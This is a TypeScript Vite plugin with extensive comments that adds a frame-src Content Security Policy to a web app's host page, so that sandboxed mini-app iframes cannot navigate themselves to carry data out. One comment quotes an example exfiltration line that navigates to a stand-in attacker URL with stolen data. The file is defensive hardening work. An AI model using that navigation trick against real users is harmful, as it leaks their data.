import type { Plugin } from 'vite';

/**
 * Host-page Content Security Policy — `frame-src` only.
 *
 * WHY THIS EXISTS
 *
 * Untrusted mini-app bundles run in a `sandbox="allow-scripts"` srcdoc
 * iframe (see packages/app/ui/components/SurfaceChannel/). That sandbox
 * plus the child document's own `default-src 'none'` meta CSP stop every
 * *fetch* out of the frame, but neither governs the frame navigating
 * ITSELF. `location.replace('https://attacker/?stolen=…')` is both
 * exfiltration (the URL carries the payload) and execution of unpinned
 * code in the frame that comes back. No `sandbox` token covers
 * self-navigation, `default-src` governs fetches rather than navigation,
 * and CSP3 dropped `navigate-to`.
 *
 * `frame-src` on the HOST page is the directive that closes it, and it is
 * the only directive here. This is the app's first CSP; a broad first
 * policy (`default-src`, `script-src`, …) would break things that were
 * never measured. Keep the scope at `frame-src` until each further
 * directive earns its own experiment.
 *
 * Measured, not assumed: apps/tlon-web/sandbox-posture/navigation.spec.ts
 * runs five self-navigation vectors against eight host configurations on
 * chromium, firefox and webkit. Two of the five (`nav-replace`,
 * `nav-href`) are stopped in-realm by the host's own `location` shim in
 * EVERY configuration, including the ones that deliberately allowlist the
 * attacker, which is what keeps the shim from being read as policy. Of
 * the remaining three, with no host CSP every one reaches the attacker
 * and commits its response; under `frame-src 'none'`, `'self'`, an
 * allowlist that excludes the attacker, or HOST_CSP_POLICY itself, every
 * one is BLOCKED-PREFLIGHT — the attacker server records no hit at all.
 * An allowlist-the-attacker control in the same delivery mechanism still
 * navigates, which is what makes the blocking attributable to `frame-src`
 * source matching rather than to the mere presence of a policy.
 *
 * The eighth configuration is `C/meta/shipped-policy`: HOST_CSP_POLICY as
 * written below, delivered by the same `<meta>` the build injects. It is
 * separate from the generic allowlist rows on purpose — "an allowlist
 * blocks" and "OUR allowlist, in OUR delivery, blocks" are different
 * claims, and only the second one is about what ships.
 *
 * DELIVERY — read this before changing anything below.
 *
 * In production tlon-web is not served by a server we control. `pnpm
 * build` output is packed into a glob (.github/workflows/build-and-glob.yml),
 * published to bootstrap.urbit.org, and referenced from `glob-http+[…]` in
 * desk/desk.docket-0. The ship's `%docket` agent — which lives in the
 * %landscape desk, NOT in this repo — serves it, and its
 * `+payload-from-glob` hardcodes the response headers to `content-type`
 * alone. There is no hook, no configuration, and no repo-local code path
 * that can add a header to that response.
 *
 * That matters because `Content-Security-Policy-Report-Only` is not
 * deliverable in a `<meta>` tag. CSP3 §3.3: "A Document may deliver a
 * policy via one or more HTML meta elements whose http-equiv attributes
 * are an ASCII case-insensitive match for the string
 * 'Content-Security-Policy'", with the note "The
 * Content-Security-Policy-Report-Only header is not supported inside a
 * meta element. Neither are the report-uri, frame-ancestors, and sandbox
 * directives."
 *
 * So: Report-Only cannot reach production, and the enforcing `<meta>` is
 * the only production delivery that exists. What is wired here is
 * therefore split:
 *
 *   - ENFORCING `<meta>`, injected into index.html by `hostCspPlugin`.
 *     This is what ships in the glob, and — because `transformIndexHtml`
 *     runs on the dev server too — it is also what `pnpm dev`, `vite
 *     preview` and the whole Playwright e2e suite now load under. Dev
 *     matches production rather than approximating it.
 *   - REPORT-ONLY, a response header on dev + preview, and now OFF. It
 *     existed to give those servers a policy while production had none;
 *     with the enforcing meta on, keeping it would put the page under two
 *     policies that refuse the same frames. See `hostCspDevHeaders`.
 *
 * Both states remain reachable from the one flag, and the Report-Only
 * validation surface is one `ENFORCE_HOST_CSP = false` away if the
 * allowlist ever has to be re-validated against real usage.
 *
 * THE ONE SIGNAL THAT SURVIVES ENFORCEMENT.
 *
 * `report-uri` is unavailable in a `<meta>` policy for the same reason
 * Report-Only is, so once enforcing there is no server-side record of a
 * refusal anywhere. `SecurityPolicyViolationEvent` is all that is left,
 * and src/logic/hostCspViolations.ts is the listener that reads it —
 * installed by main.tsx before the app mounts, sanitising a
 * bundle-chosen `blockedURI` down to scheme+host+hash, and bounded so a
 * bundle violating in a loop cannot emit telemetry in a loop. It is also
 * the instrument the Report-Only run above is measured WITH: the e2e
 * fixtures drain it per test into test-results/host-csp-violations.jsonl
 * (e2e/host-csp-collector.ts), which is what makes "the Report-Only run
 * came back clean" a countable claim rather than an absence of noticing.
 */

/**
 * Origins allowed to be framed BY the host page.
 *
 * This list is the whole audit. Every nested browsing context the web
 * build can create was enumerated; exactly one of them navigates to a
 * URL, and it is the single entry below. The rest are recorded here so a
 * future reader does not have to redo the sweep:
 *
 *   - packages/app/ui/components/SurfaceChannel/SurfaceSandboxHost.tsx:103
 *     — the mini-app sandbox. `srcdoc`, `sandbox="allow-scripts"`, with
 *     its own `default-src 'none'` meta CSP. navigation.spec.ts measures
 *     `srcdocLoads: true` under `frame-src 'none'` on chromium, firefox
 *     and webkit, so it needs no entry; `frame-src` never evaluates a
 *     srcdoc document, which is exactly why this policy can be strict.
 *   - The message/gallery/notebook composer, via `@10play/tentap-editor`'s
 *     `RichText` (packages/app/ui/components/MessageInput/index.tsx:199)
 *     onto the `react-native-webview` → `@10play/react-native-web-webview`
 *     alias (apps/tlon-web/reactNativeWebPlugin.ts:82). The call site
 *     passes `customSource: editorHtml`, a prebuilt local HTML string, and
 *     never sets `DEV`, so the shim takes its `html` branch and renders
 *     `srcDoc`. Exempt for the same reason.
 *   - packages/app/features/settings/ManageAccountScreen.tsx:102 — a
 *     `<WebView source={{uri}}>` alongside the iframe below. Dead on web
 *     (`useWebView()` returns null there), and the web shim implements
 *     only `source.html`, so a `{uri}` source renders an iframe with
 *     neither `src` nor `srcdoc`. It stays on its initial about:blank and
 *     never issues a navigation request.
 *
 * Not frames at all, and so not governed here: the `window.open` /
 * `Linking.openURL` call sites (link taps in posts, the Notes publish
 * link, the app-store banner, BOT_SETTINGS_URL, and MCP bot OAuth) all
 * open TOP-LEVEL contexts. `frame-src` does not apply to them, and
 * nothing in this policy should be widened on their account. There are no
 * `<frame>`, `<embed>` or `<object>` elements anywhere in the web build,
 * and no CAPTCHA frame (RECAPTCHA_SITE_KEY is undefined on web).
 */
export const FRAME_SRC_SOURCES = [
  // Same-origin frames. Nothing in the app frames a same-origin URL today,
  // but 'self' costs nothing against the threat being closed — the
  // measured 'B/header/frame-src-self' configuration leaves all five
  // self-navigation vectors at BLOCKED-PREFLIGHT (the three the policy
  // governs, plus the two the in-realm shim already stopped) — and it
  // keeps the policy from being the reason an ordinary same-origin embed
  // breaks later.
  "'self'",

  // Hosting account management, framed on web by
  // packages/app/features/settings/ManageAccountScreen.tsx:94. The URL is
  // the hardcoded constant MANAGE_ACCOUNT_URL
  // ('https://tlon.network/account') at that file's line 14 — one value,
  // no per-environment variation, no env var behind it.
  'https://tlon.network',

  // LATENT, deliberately not enabled: PostHog's Toolbar opens an overlay
  // frame at `ui_host` ('https://eu.posthog.com',
  // packages/app/utils/posthog.web.ts:33). Nothing in this repo calls
  // `posthog.loadToolbar` or handles the `?__posthog=` token flow, so the
  // frame cannot occur today and an entry would widen the policy for a
  // feature that is not wired up. Recorded because it is the one origin
  // that would appear if staff toolbar access were ever turned on.
  // 'https://eu.posthog.com',
] as const;

/** The policy string, identical in both delivery mechanisms. */
export const HOST_CSP_POLICY = `frame-src ${FRAME_SRC_SOURCES.join(' ')}`;

/**
 * THE ONE-LINE FLIP — now ON.
 *
 * `false` — dev and preview send `Content-Security-Policy-Report-Only`;
 * nothing is injected into index.html, so the shipped glob carries no CSP.
 *
 * `true` — injects the enforcing `<meta http-equiv>` into index.html,
 * which is the only way a policy reaches production through the glob, and
 * (see `hostCspDevHeaders`) drops the now-redundant Report-Only header so
 * the page is under exactly one policy everywhere.
 *
 * THE EVIDENCE THIS WAS FLIPPED ON. The requirement was a clean
 * Report-Only run, because `report-uri` is unavailable in a meta tag and
 * an origin missing from FRAME_SRC_SOURCES therefore becomes a silently
 * broken feature rather than a report. Two independent runs, because
 * "the policy blocks" and "the allowlist is complete" are different
 * claims and neither implies the other:
 *
 *   - BLOCKING. sandbox-posture on chromium, firefox and webkit,
 *     159/159, including `C/meta/shipped-policy` — this exact policy
 *     string, delivered by this exact `<meta>`, against a live attacker
 *     HTTP server. All five self-navigation vectors BLOCKED-PREFLIGHT
 *     with zero attacker-server hits on all three engines, while the
 *     srcdoc sandbox frame still loaded.
 *   - COMPLETENESS. The full Playwright e2e suite under Report-Only,
 *     31.2 minutes, 72 passed / 2 failed (unrelated UI flake) / 6
 *     skipped. 101 app pages drained, 101 carried a live collector, and
 *     every one reported emitted=0 dropped=0. The zero is not vacuous:
 *     e2e/host-csp.spec.ts ran inside that same suite and made the same
 *     listener fire on a real violation, so the instrument was
 *     demonstrably alive in the environment that produced the zeroes.
 *
 * Coverage that run did NOT have, recorded so the next reader can judge
 * the gap rather than assume there is none: the 6 skips were the ~bus
 * protocol-mismatch pair, invite-service (needs ~mug), media-viewer
 * (needs S3 credentials) and production-smoke. None of them frames
 * anything the audit above did not already enumerate, but none of them
 * was exercised either. ManageAccountScreen — the one entry in
 * FRAME_SRC_SOURCES a feature actually depends on — is not covered by
 * any e2e test, and is covered instead by the third case in
 * e2e/host-csp.spec.ts, which frames it and requires silence.
 */
export const ENFORCE_HOST_CSP = true;

/**
 * Injects the enforcing policy into index.html, and only when
 * ENFORCE_HOST_CSP is on. The Report-Only counterpart is a response
 * header and is configured in vite.config.mts via `hostCspDevHeaders`.
 */
export function hostCspPlugin(): Plugin {
  return {
    name: 'tlon-host-csp',
    transformIndexHtml: {
      order: 'pre',
      handler(html) {
        if (!ENFORCE_HOST_CSP) {
          return html;
        }
        return {
          html,
          tags: [
            {
              tag: 'meta',
              attrs: {
                'http-equiv': 'Content-Security-Policy',
                content: HOST_CSP_POLICY,
              },
              injectTo: 'head-prepend',
            },
          ],
        };
      },
    },
  };
}

/**
 * Report-Only header for the dev and preview servers — and ONLY while the
 * enforcing `<meta>` is off.
 *
 * The header exists to give dev a policy in a world where production has
 * none: with ENFORCE_HOST_CSP off, nothing is injected into index.html,
 * so Report-Only is the only way the allowlist can be exercised at all.
 *
 * Once the flag is on, `transformIndexHtml` runs on the dev server too,
 * so dev and preview already carry the same enforcing `<meta>` production
 * carries. Sending the header as well would leave the page under TWO
 * policies that refuse the same frames, and the engine fires one
 * `SecurityPolicyViolationEvent` per policy — so every real violation
 * would arrive twice, spending two of the listener's bounded five events
 * to report one fact, and dev would stop matching production. One policy
 * at a time, everywhere.
 *
 * It is never enforcing AS A HEADER either way: an enforcing header on
 * dev could not be delivered in production (the glob serves
 * `content-type` alone), so it would be a posture dev has and production
 * does not.
 */
export const hostCspDevHeaders: Record<string, string> = ENFORCE_HOST_CSP
  ? {}
  : { 'Content-Security-Policy-Report-Only': HOST_CSP_POLICY };
